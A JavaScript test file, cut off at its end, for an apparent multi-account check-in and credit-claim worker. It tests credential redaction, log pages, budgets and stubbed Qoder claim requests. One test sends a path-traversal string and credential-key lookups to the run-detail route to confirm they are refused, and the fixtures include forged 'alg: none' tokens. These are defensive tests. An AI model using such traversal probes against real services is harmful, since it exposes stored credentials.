  // shim 早先不存 metadata，这条链路整个没被执行过，测试照样绿。
  assert.ok(res.text.includes("唯一摘要标记-7F3A"), "列表页没渲染出 metadata 里的摘要");
  assert.ok(res.text.includes("+7"));
});

test("[详情页展示步骤与预算", async () => {
  const kv = fakeKv();
  seedFull(kv, "LOGB2");
  await tickWith(kv, [leakyTool(okStep())]);
  const key = [...kv.store.keys()].find((k) => k.startsWith("v1:run:") && k.includes("LOGB2"));
  const res = await authed(`/runs/${encodeURIComponent(key)}`, envFor(kv));
  assert.equal(res.status, 200);
  // 断言要盯住表格单元：.b-claimed 这类 CSS 名在每一页的 <style> 里都有，只 includes("claim") 会假通过
  assert.ok(res.text.includes(">claim</td>"), "应列出步骤");
  assert.ok(res.text.includes("子请求"), "应显示预算");
});

test("[键名不合法或指向别的命名空间时返回未找到页，不是 500", async () => {
  const kv = fakeKv();
  seedFull(kv, "LOGC0");
  const env = envFor(kv);
  assert.equal((await authed("/runs/%2e%2e%2fsecret", env)).status, 200);
  assert.equal((await authed("/runs/nope:whatever", env)).status, 200);
  // 借详情路由去读凭据键 / 调度索引 / 配置键：读不到，也不能把内容渲出来
  for (const foreign of ["v1:acct:fix:LOGC0", "v1:schedidx:fix", "v1:tool:fix"]) {
    const res = await authed(`/runs/${encodeURIComponent(foreign)}`, env);
    assert.equal(res.status, 200, `${foreign} 应走未找到页`);
    assert.ok(!res.text.includes(SECRET_VALUE), `${foreign} 的内容被渲到页面上了`);
    assert.equal(await readRunLog(env, foreign), null, `${foreign} 通过了 readRunLog 的白名单`);
  }
});

test("[凭据不进日志：原文、5 位短码、URL 编码与 base64 形态、label 全覆盖", async () => {
  const kv = fakeKv();
  seedFull(kv, "LOGC1");
  await tickWith(kv, [leakyTool([leakStep()])]);
  const blob = everyLogText(kv);
  for (const form of [SECRET_VALUE, PIN, encodeURIComponent(SECRET_VALUE), encodeURIComponent(PIN), btoa(SECRET_VALUE), btoa(PIN)]) {
    assert.ok(!blob.includes(form), `日志里出现了凭据形态 ${form.slice(0, 14)}…`);
  }
  assert.ok(blob.includes("••••"), "被洗掉的位置要留下打码符，否则分不清是没泄漏还是压根没写入");
});

fixtureTest("[凭据的四个出口：响应 HTML、/api/tick、cron 的 console.log、落盘日志", async () => {
  const savedSteps = FIX.steps;
  FIX.steps = [leakStep()];
  const kv = fakeKv();
  const env = envFor(kv);
  try {
    seedFull(kv, "EXIT1");
    const html = await hit(`/account/fix/EXIT1/run?pwd=${PASSWORD}`, { method: "POST", body: form({ pwd: PASSWORD }), env });
    assert.equal(html.status, 200);
    assert.ok(!html.text.includes(SECRET_VALUE), "手动执行的响应 HTML 里有凭据原文");
    assert.ok(!html.text.includes(PIN), "手动执行的响应 HTML 里有短验证码原文");

    seedFull(kv, "EXIT2");
    const api = await authed("/api/tick", env);
    assert.ok(!api.text.includes(SECRET_VALUE), "/api/tick 响应里有凭据原文");
    assert.ok(!api.text.includes(PIN), "/api/tick 响应里有短验证码原文");

    seedFull(kv, "EXIT3");
    const logs = [];
    const orig = console.log;
    console.log = (...a) => logs.push(a.join(" "));
    try {
      await worker.scheduled({ cron: "*/30 * * * *", scheduledTime: cst(11) * 1000 }, env);
    } finally {
      console.log = orig;
    }
    assert.ok(logs.some((l) => l.includes("[checkin] {")), "cron 该输出结构化汇总");
    // Workers Logs 会长期留存并可 Logpush 导出，比 KV 更容易外流
    assert.ok(!logs.join("\n").includes(SECRET_VALUE), "cron 的 console.log 里有凭据原文");
    assert.ok(!everyLogText(kv).includes(SECRET_VALUE), "落盘日志里有凭据原文");
  } finally {
    FIX.steps = savedSteps;
  }
});

test("[非敏感的枚举值不能被当秘密洗：plan=pro 要原样留在摘要里", async () => {
  const kv = fakeKv();
  seedFull(kv, "ENUM1");
  await tickWith(kv, [leakyTool([{
    id: "claim", label: "领取", cost: 4,
    async run() { return { status: "error", message: "套餐 pro 的进程进度 3/4" }; },
  }])]);
  const key = [...kv.store.keys()].find((k) => k.startsWith("v1:run:"));
  // 旧的按长度反向替换会把枚举值 pro 从 "process" 这类正常文案里挖掉；
  // 现在只洗声明了 secret 的字段，枚举值不参与，所以这句必须完整
  assert.ok(kv.store.get(key).includes("套餐 pro 的进程进度"), "枚举值被当成凭据反向替换了");
});

test("[熵门槛：被误标 secret 的短枚举值不洗，5 位短信码照洗", async () => {
  // 这条修的是 §6.4 那个"给第 5 个工具埋的坑"：`secret` 由字段声明说了算，
  // 而工具作者会误把枚举值标成 secret（套餐档位、模式开关）。
  // 没有门槛时值 "pro" 会让 message 里每次出现 pro 都变成 8 个黑点。
  //
  // 反方向同样重要：WorkBuddy 的短信验证码是 5 位纯数字，按"长度门槛"过滤会整类漏掉。
  // 早先的版本正是靠长度过滤，5 位码整个漏出去过。所以门槛必须看"有没有信息量"，
  // 不能只看长度。
  const short = scrubSecrets("套餐 pro 已升级，status=ok，HTTP 401，重试 1 次", ["pro", "ok", "1", "free"]);
  assert.equal(short, "套餐 pro 已升级，status=ok，HTTP 401，重试 1 次",
    "短枚举值不该被洗成黑点：诊断文案被毁掉比泄漏一个枚举值严重得多");

  // 5 位纯数字：长度够、含数字，两条低熵判据都不命中 → 必须照洗
  const pin = scrubSecrets("验证码 44321 提交失败", ["44321"]);
  assert.ok(!pin.includes("44321"), `5 位短信码必须洗掉：${pin}`);
  assert.match(pin, /提交失败/, "洗掉之后其余文案要留着");

  // 短但含数字的组合（长度 4，含数字）也照洗 —— 它不是自然语言里的枚举词
  assert.ok(!scrubSecrets("工单 A1b2 已处理", ["A1b2"]).includes("A1b2"), "含数字的短码不该放过");

  // 真凭据永远照洗，无论形态
  for (const real of ["eyJhbGciOiJIUzI1NiJ9.SUPERSECRETVALUE.doNotLeak", "rt-wb-old-XXXXXXXX", "0123456789abcdef"]) {
    assert.ok(!scrubSecrets(`上游回显 ${real} 结束`, [real]).includes(real), `真凭据必须洗掉：${real}`);
  }
  // 长纯字母也不是枚举（"abcdefgh" 这种），仍要洗
  assert.ok(!scrubSecrets("上游回了 abcdefgh 结束", ["abcdefgh"]).includes("abcdefgh"),
    "长纯字母仍具信息量，不该被当枚举放过");

  // URL 编码 / base64 形态也要过门槛：低熵值即使变形也一并放过
  assert.equal(scrubSecrets("free", ["free"]), "free");
});

test("[含长 base64 路径的合法回调 URL 不该被兜底正则整段吃掉", async () => {
  const kv = fakeKv();
  seedFull(kv, "URL1");
  const url = "https://api.oem.com/callback/abcdefghijklmnopqrstuvwxyz0123456789/status";
  await tickWith(kv, [leakyTool([{
    id: "claim", label: "领取", cost: 4,
    async run() { return { status: "error", message: `回调地址 ${url} 已登记` }; },
  }])]);
  const blob = everyLogText(kv);
  // 排查「回调没生效」恰恰需要看这段路径，泛化的长 base64 正则把它洗成了 ••••
  assert.ok(blob.includes("/callback/"), "回调地址中段被洗掉了");
  assert.ok(blob.includes("/status"), "回调地址尾段被洗掉了");
});

test("[一步没做的轮次报「今日已领」，且不重复计积分", async () => {
  assert.equal(aggregate([{ status: "claimed", reused: true }, { status: "ok", reused: true }]), "already",
    "全部复用进度的一轮不该报成功领取 —— 上游一个请求都没收到");
  const kv = fakeKv();
  seedFull(kv, "REU1");
  // 造一个 stale 进度（clearProgress 写失败留下的）：单步工具、这一步今天已经 claimed
  kv.store.set("v1:step:fix:REU1", JSON.stringify({
    day: logicalDay(0, cst(10)), done: { claim: { status: "claimed", message: "ok", credits: 50 } }, order: ["claim"],
  }));
  const { summary } = await tickWith(kv, [leakyTool([{ id: "claim", label: "领取", cost: 4, async run() { return { status: "claimed", message: "又领了一次", credits: 50 }; } }])]);
  const view = summary.plan[0].accounts[0];
  assert.equal(view.status, "already", "复用轮报了成功领取，用户会以为这一轮真领到了东西");
  assert.equal(view.credits, 0, "复用来的积分不该再算一遍");
});

fixtureTest("[「执行」跳过到期判定立刻跑，但仍受预算约束", async () => {
  const kv = fakeKv();
  seedFull(kv, "MANUAL1");
  const tool = leakyTool(okStep());
  const budget = makeBudget(45);
  await runTick({ env: { ...envFor(kv), CHECKIN_KV: trackedKv(kv, budget) }, budget, tools: [tool], trigger: "manual", now: cst(10) });
  assert.equal(JSON.parse(kv.store.get("v1:schedidx:fix")).entries.MANUAL1.lastStatus, "claimed");
  kv.calls.length = 0;
  const res = await hit("/account/fix/MANUAL1/run", { method: "POST", body: form({ pwd: PASSWORD }), env: envFor(kv) });
  assert.equal(res.status, 200);
  assert.ok(res.text.includes("MANUAL1"));
  assert.ok(kv.count > 0, "手动执行应当真的动了 KV");
});

fixtureTest("[工具配置未完成时「执行」被拒绝，不拿残缺配置打上游", async () => {
  const kv = fakeKv();
  seedFull(kv, "CFG1");
  kv.store.delete("v1:tool:fix");          // 配置整个没填
  const tool = leakyTool([]);
  tool.config = [{ key: "endpoint", label: "接入点", required: true }];
  tool.steps = [{ id: "claim", label: "领取", cost: 4, async run() { throw new Error("不该被执行"); } }];
  const callsBefore = kv.count;
  const view = await runAccountNow({ env: envFor(kv), budget: makeBudget(45), tool, uid: "CFG1", trigger: "manual", now: cst(10) });
  assert.equal(view.status, "error");
  assert.match(view.message, /工具配置未完成/, "要如实说是被配置闸挡住的");
  assert.match(view.message, /接入点/, "要说出缺哪一项");
  assert.ok(kv.count - callsBefore <= 1 + FLAGS_FRAME, `拒绝路径只该花一次读 + 一次停用标记，实际 ${kv.count - callsBefore} 次`);
  assert.ok(!kv.store.has("v1:step:fix:CFG1"), "被拒绝的执行不该留下进度");
  const page = await hit("/account/fix/CFG1/run", { method: "POST", body: form({ pwd: PASSWORD }), env: envFor(kv) });
  assert.ok(page.text.includes("工具配置未完成"), "页面上要看得出的原因");
});

fixtureTest("[「测试」按钮只在工具实现了 validate 时出现", async () => {
  const kv = fakeKv();
  const env = envFor(kv);
  seedFull(kv, "VALA1");
  const withValidate = await authed("/tool/fix", env);
  assert.match(withValidate.text, /name="pwd"[^>]*>\s*<button[^>]*type="submit"[^>]*>测试/);

  const original = FIX.validate;
  delete FIX.validate;
  try {
    const without = await authed("/tool/fix", env);
    assert.ok(!/>\s*测试\s*</.test(without.text), "工具没实现 validate，按钮不该出现");
  } finally {
    FIX.validate = original;
  }
});

fixtureTest("[手动测试不写状态、不写日志、不新建索引", async () => {
  const kv = fakeKv();
  seedFull(kv, "VALB1");
  const res = await hit("/account/fix/VALB1/validate", { method: "POST", body: form({ pwd: PASSWORD }), env: envFor(kv) });
  assert.equal(res.status, 200);
  assert.ok(res.text.includes("会话票据格式有效"));
  assert.equal(logKeys(kv).length, 0, "测试不该写运行日志");
  assert.ok(!kv.store.has("v1:schedidx:fix"), "测试连调度索引都不该新建");
});

test("[测试的响应 HTML 也不含凭据原文", async () => {
  const savedValidate = FIX.validate;
  FIX.validate = async (ctx) => ({ status: "error", message: `票据 ${JSON.stringify(ctx.account.cred)} 被拒` });
  const kv = fakeKv();
  seedFull(kv, "VALC1");
  try {
    const res = await hit("/account/fix/VALC1/validate", { method: "POST", body: form({ pwd: PASSWORD }), env: envFor(kv) });
    assert.ok(!res.text.includes(SECRET_VALUE), "validate 的响应把凭据回显出来了");
    assert.ok(!res.text.includes(PIN), "validate 的响应把短验证码回显出来了");
  } finally {
    FIX.validate = savedValidate;
  }
});

fixtureTest("[需要处理的账号会在工具页顶部出现红条，损坏记录也算", async () => {
  const kv = fakeKv();
  seedFull(kv, "STUCK1");
  kv.store.set("v1:acct:fix:BRK9", "{not json");
  await tickWith(kv, [leakyTool([{ id: "a", label: "甲", cost: 4, async run() { return { status: "login_required", message: "401" }; } }])]);
  const page = await authed("/tool/fix", envFor(kv));
  assert.ok(page.text.includes("需要你处理"), "缺红条");
  assert.ok(page.text.includes("STUCK1"));
  // 损坏记录进不了调度索引，而红条是从索引算的 —— 它必须靠账号列表补上
  assert.ok(/需要你处理[\s\S]{0,200}BRK9/.test(page.text), "红条漏了损坏记录");
});

fixtureTest("[日志列表与总览流显示备注名，不是 uid", async () => {
  const kv = fakeKv();
  seedFull(kv, "LBL01");
  await tickWith(kv, [leakyTool(okStep())]);
  const env = envFor(kv);
  // 写侧：meta.label 记的是记录那一刻的备注名
  const run = (await listRunLog(env, { limit: 20, toolIds: ["fix"] })).find((r) => r.kind === "run");
  assert.equal(run.meta.label, "备注-LBL01", "运行日志 metadata 里该有备注名");
  // 读侧：列表页对象列、总览流都优先显示备注名；uid 仍留在详情页正文里可查
  const list = await authed("/runs", env);
  assert.ok(list.text.includes("fix/备注-LBL01"), "列表页对象列该显示备注名");
  assert.ok(!list.text.includes("fix/LBL01"), "列表页不该再以 tool/uid 形态显示（uid 出现在详情链接里是正常的）");
  const home = await authed("/", env);
  assert.ok(home.text.includes("fix/备注-LBL01"), "总览流该显示备注名");
  const detail = await authed(`/runs/${encodeURIComponent(run.key)}`, env);
  assert.ok(detail.text.includes("备注-LBL01"), "详情页标题该显示备注名");
});

fixtureTest("[损坏记录要在 /runs 里露头", async () => {
  const kv = fakeKv();
  seedFull(kv, "BRKOK");
  kv.store.set("v1:acct:fix:BRKX", "{not json");
  await tickWith(kv, [leakyTool(okStep())]);
  const runs = await listRunLog(envFor(kv), { limit: 20, toolIds: ["fix"] });
  assert.ok(runs.some((r) => r.key.includes("BRKX")), "损坏记录没写账号日志，它在观测层是隐形的");
  const page = await authed("/runs", envFor(kv));
  assert.ok(page.text.includes("BRKX"), "日志列表页搜不到损坏记录");
  // 但不许因此把假状态固化进索引
  const idx = JSON.parse(kv.store.get("v1:schedidx:fix") || '{"entries":{}}');
  assert.equal(idx.entries.BRKX, undefined, "坏记录不该被写进调度索引");
});

fixtureTest("[工具页成本有上界：60 个账号不撞 50 硬顶，并如实说明截断", async () => {
  const kv = fakeKv();
  kv.store.set("v1:tool:fix", JSON.stringify({ portal: "cn", timeoutSec: "15" }));
  for (let i = 0; i < 60; i += 1) {
    kv.store.set(`v1:acct:fix:SEAT${i}`, JSON.stringify({
      label: `座${i}`, cred: { seatId: `SEAT${i}`, plan: "pro", session: SECRET_VALUE }, createdAt: 1, updatedAt: 1,
    }));
  }
  const res = await authed("/tool/fix", envFor(kv));
  assert.equal(res.status, 200, `60 个账号时工具页 500 了（子请求 ${kv.count} 次）`);
  assert.ok(kv.count < 50, `工具页用了 ${kv.count} 次子请求`);
  assert.match(res.text, /只列出前 20 个/, "截断了要说明");
  assert.match(res.text, /共 60 个账号/, "总数要说实话，好让人知道少了多少");
});

test("[索引写回只覆盖自己改过的那几位", async () => {
  const kv = fakeKv();
  const env = envFor(kv);
  seedFull(kv, "PARA1");
  seedFull(kv, "PARA2");
  const stale = await loadSchedIndex(env, "fix");          // A 轮次开始时读的快照
  await runAccountNow({
    env: { ...env, CHECKIN_KV: trackedKv(kv, makeBudget(45)) }, budget: makeBudget(45),
    tool: leakyTool(okStep()), uid: "PARA2", now: cst(10),
  });                                                        // B 在 A 运行期间写完并落了条目
  stale.entries.PARA1 = { ...schedOf(stale.entries.PARA1), lastStatus: "claimed", lastStatusDate: logicalDay(0, cst(10)) };
  await commitSchedEntries(env, "fix", { PARA1: stale.entries.PARA1 });
  const entries = JSON.parse(kv.store.get("v1:schedidx:fix")).entries;
  // 老写法是整份覆盖：A 那份 stale 快照一写，B 刚落的条目就没了
  assert.deepEqual(Object.keys(entries).sort(), ["PARA1", "PARA2"], "只提交自己那几位，别人的更新必须留着");
  assert.equal(entries.PARA2.lastStatus, "claimed");
});

fixtureTest("[首页有最近运行流", async () => {
  const kv = fakeKv();
  seedFull(kv, "FEED1");
  await tickWith(kv, [leakyTool(okStep())]);
  const home = await authed("/", envFor(kv));
  assert.ok(home.text.includes("最近运行"));
  assert.ok(home.text.includes("FEED1"));
});

// 2026-10-01 用户拿线上截图反馈：最近运行里 N 条记录首尾相连成一段文字。
// 根因是 layout.js 的内联 CSS 里从来没有 .flowitem / .prog 这两条规则 ——
// 它们只存在于当年的设计稿 ui-preview.html 里，没跟着搬进代码。
// 后果比"不好看"严重：<a> 保持行内元素，多条记录连成一行；而 <i> 是空元素，
// 没有显式宽高就是 0×0，卡片上的账号进度条会什么都不剩。
test("总览的运行流与进度条有布局规则：<a> 必须显式 flex，色块必须显式宽高", async () => {
  const kv = fakeKv();
  seedFull(kv, "FLOW1");
  await tickWith(kv, [leakyTool(okStep())]);
  const page = await authed("/", envFor(kv));
  const css = page.text.match(/<style>([\s\S]*?)<\/style>/)[1];

  // 运行流的每一行：<a class="flowitem"> 里挨着放 who / 徽章 / 摘要 / 时间。
  // 不写 display:flex 就还是行内元素，多条记录会连成一段。
  assert.match(css, /\.flowitem\{[^}]*display:flex/, "运行流没显式 flex，多条记录会连成一行");
  // .who 固定宽 + 省略号：不给固定宽，每行的摘要起点都不一样，时间戳也就参差不齐
  assert.match(css, /\.flowitem \.who\{[^}]*width:96px/, "运行流的账号列没有固定宽，时间戳会参差不齐");
  assert.match(css, /\.flowitem \.m\{[^}]*flex:1/, "摘要列不吃掉剩余空间，右边的时间戳会被顶走");
  // 首行不该有分隔线（:first-child 命中的是第一条记录，不是容器）
  assert.match(css, /\.flowitem:first-child\{[^}]*border-top:0/, "运行流首行不该有分隔线");

  // 进度条：<i> 是空元素，必须有显式宽高，否则 0×0
  assert.match(css, /\.prog i\{[^}]*width:16px[^}]*height:5px/, "进度条的色块没有尺寸，卡片上什么都看不到");
  assert.match(css, /\.prog i\.done\{/, "进度条缺「已结」配色");
  assert.match(css, /\.prog i\.bad\{/, "进度条缺「待处理」配色");
  assert.match(css, /\.prog i\.wait\{/, "进度条缺「顺延/限频」配色");

  // 也不能反过来变成多行：账号多的时候色块该换行，不该把卡片撑成长长一条
  assert.match(css, /\.prog\{[^}]*flex-wrap:wrap/, "进度条不该把色块挤在一行");
});

test("[?tool= 筛选日志，且成本与日志总量无关", async () => {
  const kv = fakeKv();
  seedFull(kv, "FILT1");
  await tickWith(kv, [leakyTool(okStep())]);
  const env = envFor(kv);
  assert.ok((await authed("/runs?tool=fix", env)).text.includes("FILT1"));
  assert.ok(!(await authed("/runs?tool=nonexistent", env)).text.includes("FILT1"));

  // 工具段在键名里 ⇒ 筛一个几乎没记录的工具也只需一次 list。
  // 老写法（时间段在前 + 扫全量过滤）在这里要翻 5 页且永远筛不到，历史越久越读不到。
  for (let i = 0; i < 4000; i += 1) {
    kv.store.set(`v1:run:other:${String(8209000000000 - i).padStart(13, "0")}:U${i}`, "{}");
  }
  kv.calls.length = 0;
  const filtered = await listRunLog(env, { limit: 30, toolId: "fix" });
  assert.equal(filtered.length, 1, `筛 FIX 只该拿到那一条 FIX 日志，实际 ${filtered.length} 条`);
  assert.equal(kv.calls.filter((c) => c === "list").length, 1, `4000 条他工具日志下筛 FIX 用了 ${kv.count} 次 list`);
});

test("[归并后的日志列表按时间倒序，身份取自键名而不是 metadata", async () => {
  const kv = fakeKv();
  const env = envFor(kv);
  const tool = leakyTool(okStep());
  const budget = makeBudget(45);
  for (let i = 0; i < 12; i += 1) {
    await writeRunLog(env, {
      now: DAY + i * 60, tool, account: { cred: { seatId: `U${i}` } }, budget, trigger: "cron",
      result: { uid: `U${String(i).padStart(2, "0")}`, label: "L", status: "claimed", message: "ok", credits: 0, steps: [] },
    });
  }
  const recent = await listRunLog(env, { limit: 3, toolIds: ["fix"] });
  assert.deepEqual(recent.map((e) => e.uid), ["U11", "U10", "U09"], "列表应从最新往旧取");
  assert.deepEqual(recent.map((e) => e.kind), ["run", "run", "run"]);
  assert.equal(recent[0].tool, "fix");
  assert.ok(Number.isFinite(recent[0].at));
});

test("[预约的上界不小于真实用量", async () => {
  const kv = fakeKv();
  seedFull(kv, "FRAME1");
  const { budget } = await tickWith(kv, [leakyTool(okStep())]);
  // 账本靠 TOOL_FRAME / ACCOUNT_FRAME 预约来判"这一步装不装得下"。
  // 预约小于真实用量就等于给出一张比生产环境乐观的假票：第 51 次请求会把整轮炸掉。
  const reserved = TOOL_FRAME + ACCOUNT_FRAME + FLAGS_FRAME;
  assert.ok(budget.used <= reserved, `一轮一号真实用了 ${budget.used}，超过预约的 ${reserved}`);
  assert.equal(budget.over, 0, "一轮一号不该超支");
});

// ═══════════ Qoder ═══════════
//
// 这一节验的是"方言翻译"对不对，全部用字节级请求桩，不打真实站点。
// 桩记录每一次请求的 method / URL / header / body，所以头拼错、GET 带了 body、
// 401 之后重试了几次这类事都能当场抓住。

const QODER_HOST = "openapi.qoder.com.cn";
const mkJwt = (claims) => {
  const enc = (obj) => btoa(JSON.stringify(obj)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
  return `${enc({ alg: "none" })}.${enc(claims)}.sig`;
};

function stubUpstream(routes) {
  const seen = [];
  const saved = globalThis.fetch;
  globalThis.fetch = async (input, init = {}) => {
    const url = new URL(typeof input === "string" ? input : input.url);
    const record = { host: url.hostname, path: url.pathname, method: (init.method || "GET").toUpperCase(), headers: init.headers || {}, body: init.body };
    seen.push(record);
    const handler = routes[`${record.method} ${record.path}`] || routes[url.pathname];
    if (!handler) return new Response(JSON.stringify({ error: "stub 没配这条路由" }), { status: 599 });
    const out = typeof handler === "function" ? handler(record, seen.length) : handler;
    return new Response(out.body === undefined ? JSON.stringify(out.payload ?? null) : out.body, { status: out.status ?? 200 });
  };
  return { seen, restore: () => { globalThis.fetch = saved; } };
}

function seedQoder(kv, uid = "qdr-77001", { sub = uid, exp = cst(30), device = true, campaigns } = {}) {
  const config = { clientType: "10" };
  if (device) Object.assign(config, { machineToken: "MT-real", machineCode: "MC-real", machineId: "MI-real", version: "0.1.43" });
  kv.store.set("v1:tool:qoder", JSON.stringify(config));
  kv.store.set(`v1:acct:qoder:${uid}`, JSON.stringify({
    label: `Q 主号-${uid}`,
    cred: { accessToken: mkJwt({ sub, exp }), refreshToken: "rt-old-0001112223334445" },
    createdAt: 1, updatedAt: 1,
  }));
  kv.store.set("v1:schedidx:qoder", JSON.stringify({ day: null, entries: {} }));
  if (campaigns !== undefined) kv.__campaigns = campaigns;
  return { uid, config };
}

// 默认桩：一份"两个可领 + 一个今天已领"的活动列表
const qoderCampaigns = (list) => ({
  "GET /sash/api/v1/me/campaigns": { payload: { campaigns: list } },
  "POST /api/v1/deviceToken/refresh": (rec) => ({
    payload: { token: mkJwt({ sub: "qdr-77001", exp: cst(60) }), refreshToken: `rt-new-${rec ? "rotated" : "x"}`, expires_in: 86400 },
  }),
});
const claimable = (n) => Array.from({ length: n }, (_, i) => ({
  campaignId: `cmp-${i}`, campaignKey: `key-${i}`, actionType: "CLAIM_BENEFIT", claimStatus: "CLAIMABLE",
  startAt: cst(9), endAt: cst(23), benefit: { amount: 20 },
}));
const qoderTick = (kv, now = cst(11)) => tickWith(kv, [findTool("qoder")], 45, now);

test("[qoder] 请求形状：GET 不带 body 与 Content-Type，claim 带空对象体，设备头齐全", async () => {
  const kv = fakeKv();
  seedQoder(kv, "qdr-77001", { campaigns: claimable(1) });
  const stub = stubUpstream({ ...qoderCampaigns(claimable(1)), "POST /sash/api/v1/me/campaigns/cmp-0/claim": { payload: { data: { status: "CLAIMED", benefit: { amount: 20 }, replayed: false } } } });
  try {
    const { summary } = await qoderTick(kv);
    const list = stub.seen.find((r) => r.path.endsWith("/campaigns"));
    const claim = stub.seen.find((r) => r.path.endsWith("/claim"));
    assert.equal(list.method, "GET");
    assert.equal(list.body, undefined, "GET 不该带请求体");
    assert.equal(list.headers["Content-Type"], undefined, "GET 带 Content-Type 会被某些网关当成写请求");
    assert.equal(claim.method, "POST");
    assert.equal(claim.body, "{}", "claim 的空体必须是字面 {}");
    assert.equal(claim.headers["Content-Type"], "application/json");
    for (const name of ["Cosy-ClientType", "Cosy-MachineToken", "Cosy-MachineCode", "Cosy-MachineId", "Cosy-Version"]) {
      assert.ok(claim.headers[name], `缺设备身份头 ${name}`);
    }
    assert.equal(claim.headers["Cosy-ClientType"], "10", "缺这个头时上游返回空列表，必须是 10");
    assert.match(claim.headers.Authorization, /^Bearer eyJ/);
    assert.equal(claim.headers["User-Agent"], "Qoder/claim");
    assert.ok(stub.seen.every((r) => r.host === QODER_HOST), "发出了白名单外的域名请求");
    assert.equal(planOf(summary, "qoder").accounts[0].status, "claimed");
  } finally {
    stub.restore();
  }
});

test("[qoder] 领取成功算积分，多活动各发一次 claim", async () => {
  const kv = fakeKv();
  seedQoder(kv);
  const stub = stubUpstream({
    ...qoderCampaigns(claimable(3)),
    "POST /sash/api/v1/me/campaigns/cmp-0/claim": { payload: { data: { status: "CLAIMED", benefit: { amount: 30 } } } },
    "POST /sash/api/v1/me/campaigns/cmp-1/claim": { payload: { data: { status: "CLAIMED", benefit: { amount: 15 } } } },
    "POST /sash/api/v1/me/campaigns/cmp-2/claim": { payload: { data: { status: "CLAIMED", benefit: { amount: 5 } } } },
  });
  try {
    const { summary } = await qoderTick(kv);
    const view = planOf(summary, "qoder").accounts[0];
    assert.equal(view.status, "claimed");
    assert.equal(view.credits, 50);
    assert.equal(stub.seen.filter((r) => r.path.endsWith("/claim")).length, 3);
  } finally { stub.restore(); }
});

test("[qoder] amount=0 是合法领取，不能被 || 兜底成列表里的数字", async () => {
  const kv = fakeKv();
  seedQoder(kv);
  const zero = [{ campaignId: "cmp-z", campaignKey: "z", actionType: "CLAIM_BENEFIT", claimStatus: "CLAIMABLE", benefit: { amount: 999 } }];
  const stub = stubUpstream({
    "GET /sash/api/v1/me/campaigns": { payload: { campaigns: zero } },
    "POST /sash/api/v1/me/campaigns/cmp-z/claim": { payload: { data: { status: "CLAIMED", benefit: { amount: 0 } } } },
  });
  try {
    const { summary } = await qoderTick(kv);
    const view = planOf(summary, "qoder").accounts[0];
    assert.equal(view.status, "claimed");
    assert.equal(view.credits, 0, "真领到 0 却报成列表里的 999，日志里的成就就凭空多了");
    assert.match(view.message, /本次到账 0/);
  } finally { stub.restore(); }
});

test("[qoder] 上游判为幂等重放时如实说，不冒充新领到", async () => {
  const kv = fakeKv();
  seedQoder(kv);
  const stub = stubUpstream({
    "GET /sash/api/v1/me/campaigns": { payload: { campaigns: claimable(1) } },
    "POST /sash/api/v1/me/campaigns/cmp-0/claim": { payload: { data: { status: "CLAIMED", benefit: { amount: 20 }, replayed: true } } },
  });
  try {
    const { summary } = await qoderTick(kv);
    assert.match(planOf(summary, "qoder").accounts[0].message, /幂等重放/);
  } finally { stub.restore(); }
});

test("[qoder] 活动列表为空报 inactive，并把三种可能说清（旧实现报成绿色已领取）", async () => {
  const kv = fakeKv();
  seedQoder(kv);
  const stub = stubUpstream({ "GET /sash/api/v1/me/campaigns": { payload: { campaigns: [] } } });
  try {
    const { summary } = await qoderTick(kv);
    const view = planOf(summary, "qoder").accounts[0];
    // inactive 不能被聚合成 already：两者都上闩，但界面上是"今天不用管"和"今天已拿到"的区别
    assert.equal(view.status, "inactive", "空列表被压成 already 时，设备身份过期能坏几周都不被发现");
    assert.match(view.message, /设备身份/);
    assert.match(view.message, /资格|没下发/);
    const page = await authed("/tool/qoder", envFor(kv));
    assert.ok(!page.text.includes("需要你处理"), "inactive 不需要人动手，不该亮红条");
  } finally { stub.restore(); }
});

test("[qoder] 设备身份是必填的工具级配置：没填全时整家在配置闸就被跳过，不打上游", async () => {
  const kv = fakeKv();
  seedQoder(kv, "qdr-nodev", { device: false });
  const stub = stubUpstream({ "GET /sash/api/v1/me/campaigns": { payload: { campaigns: [] } } });
  try {
    const { summary } = await qoderTick(kv);
    assert.equal(planOf(summary, "qoder").skipped, "配置未完成");
    assert.equal(stub.seen.length, 0, "配置没填全就该整个工具跳过，一次上游都不该打");
    const page = await authed("/tool/qoder/settings", envFor(kv));
    assert.match(page.text, /工具配置未完成/);
  } finally { stub.restore(); }
});

test("[qoder] CLAIMED 且在窗口内 → already；endAt 缺失当无界，不当「1970 就结束」", async () => {
  const kv = fakeKv();
  seedQoder(kv);
  const noEnd = [{ campaignId: "cmp-n", campaignKey: "n", actionType: "CLAIM_BENEFIT", claimStatus: "CLAIMED", startAt: cst(9) }];
  const stub = stubUpstream({ "GET /sash/api/v1/me/campaigns": { payload: { campaigns: noEnd } } });
  try {
    const { summary } = await qoderTick(kv);
    assert.equal(planOf(summary, "qoder").accounts[0].status, "already", "缺 endAt 被当成已结束，真领到的活动会被报成未下发");
  } finally { stub.restore(); }
});

test("[qoder] 活动未下发是 pending：不上闩、不亮红条、下一轮接着看", async () => {
  const kv = fakeKv();
  seedQoder(kv);
  const later = [{ campaignId: "cmp-l", campaignKey: "l", actionType: "CLAIM_BENEFIT", claimStatus: "PENDING", startAt: cst(20), endAt: cst(23) }];
  const stub = stubUpstream({ "GET /sash/api/v1/me/campaigns": { payload: { campaigns: later } } });
  try {
    const now = cst(11);
    const first = await qoderTick(kv, now);
    assert.equal(planOf(first.summary, "qoder").accounts[0].status, "pending");
    assert.equal(schedEntryOf(kv, "qoder", "qdr-77001").lastStatus, "pending");
    // pending 不是"活干到一半"，只是上游还没下发，所以给它一道单独的、更宽的闸。
    // 少了这道闸：可接续豁免了 minIntervalSec 与 maxDaily，从活动窗口开到当天结束
    // 每 30 分钟打一次 = 一个账号一天 28 次纯查询，在风控看来与刷接口无异。
    const tooSoon = await qoderTick(kv, now + 1800);
    assert.equal(tooSoon.summary.ran, 0, "pending 在 1 小时内不该再打上游");
    assert.equal(stub.seen.filter((r) => r.path.endsWith("/campaigns")).length, 1, "30 分钟后这次必须一个请求都没发");
    const inTime = await qoderTick(kv, now + 3600);
    assert.equal(inTime.summary.ran, 1, "pending 不能被当成今天已结而不重试");
    const page = await authed("/tool/qoder", envFor(kv));
    assert.ok(!page.text.includes("需要你处理"), "pending 是正常等待，不该亮红条");
  } finally { stub.restore(); }
});

test("[qoder] 401 → 续期 → 只重试一次；新凭据当场写回 KV", async () => {
  const kv = fakeKv();
  const { uid } = seedQoder(kv);
  let refreshed = 0;
  const stub = stubUpstream({
